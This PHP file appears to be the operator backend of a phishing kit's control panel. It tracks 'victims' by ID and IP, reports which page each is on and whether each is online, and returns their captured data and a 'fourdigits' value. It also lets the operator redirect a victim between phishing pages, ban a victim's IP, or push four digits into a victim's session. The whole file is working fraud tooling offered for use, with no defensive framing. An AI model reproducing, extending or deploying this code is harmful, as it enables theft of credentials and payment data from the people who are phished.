<?php 

require '../classes/Jeehan.class.php';
$jeehan = new Jeehan();
$jeehan->createVic();
$pdo = $jeehan->_pdo;


if(isset($_POST['redirectionListener'])){
	echo $jeehan->get("redirect");
}



if(isset($_POST['clearRedirection'])){
	 $jeehan->redirect(0);
}



if(isset($_POST['getVictimData'])){
	$id = $_POST['vid'];
	$statu = "off";	
	$page = $jeehan->getUser("current_page", $id);
	
	if($jeehan->getUser("last_act", $id)  > (time() - 10)){
		$statu="on";
	}else{
		$statu="off";
	}
	$data = new stdClass();
	$data->page = $page;
	$data->data = $jeehan->getUser("data", $id);
	$data->statu = $statu;
	$data->fourdigits = $jeehan->getUser("fourdigits", $id);
	$data = json_encode($data);
	echo $data;
}




if(isset($_POST['getVictims'])){
	$c = 0;
$res = "
<tr>
<th><i class='fa fa-user'></i> ID</th>
<th><i class='fa fa-globe'></i> IP</th>
<th><i class='fa-solid fa-file-lines'></i> Current Page</th>
<th><i class='fa fa-cog'></i> Action</th>
</tr>";

	$getAll=$pdo->query("SELECT * FROM ".($jeehan->tbl)." WHERE ip NOT in (select ip from blockedvics) and last_act > ".(time() -5));
	$rows = $getAll->fetchAll(PDO::FETCH_ASSOC);
	if(!$rows){
		$res .= "<tr><td>No data</td></tr>";
	}else{
		foreach($rows as $row){

			$c++;		
			if($c==2){
				$css="selected";
				$c=0;
			}else{
				$css="";
			}
$ip = $row['ip'];
$res .= "
<tr class='$css'>
<td> ".$row['id']." </td>
<td> ".$row['ip']."   </td>
<td>".$row['current_page']."</td>
<td><button onclick='view(".$row['id'].")'>Control <i class='fa-solid fa-arrow-right'></i></button> <button class='ban' onclick='ban(\"$ip\")'><i class='fa-solid fa-ban'></i> Ban </button></td>
</tr>
";



		}

	}
	echo "<table>$res</table>";
}



if(isset($_POST['keepAlive'])){
 $jeehan->keepAlive(time(), $_POST['page']);
}



if(isset($_POST['ban'])){
 $jeehan->block($_POST['ban']);
 echo "Victim [".$_POST['ban']."] has been blocked.";
}


if(isset($_POST['dgt'])){
 if($jeehan->setFour( $_POST['dgt'], $_POST['id'])){
	echo $_POST['dgt']." added to victim [ID:".$_POST['id']."]";
 }else{
	 echo 'error';
 }
}



if(isset($_POST['getOnlineVics'])){
	echo getOnlines();
}


function getOnlines(){
	global $jeehan;
$res = "<div class='connections'>";
 $on = $jeehan->getOnlineVics();
 if($on>=1){
	 $res .= "<div class='connected'>$on</div>";
 }else{
	 $res .= "<div class='disconnected'>$on</div>";
 }
 $res .= "</div>";
 return $res;
}



if(isset($_POST['pageID'])){
	$pageID = $_POST['pageID'];
	$vicID = $_POST['vicID'];
	$update = $pdo->prepare("UPDATE ".($jeehan->tbl)." SET redirect=:r WHERE id=:id");
	$update->execute([":r"=>$pageID, ":id"=>$vicID]);
}








?>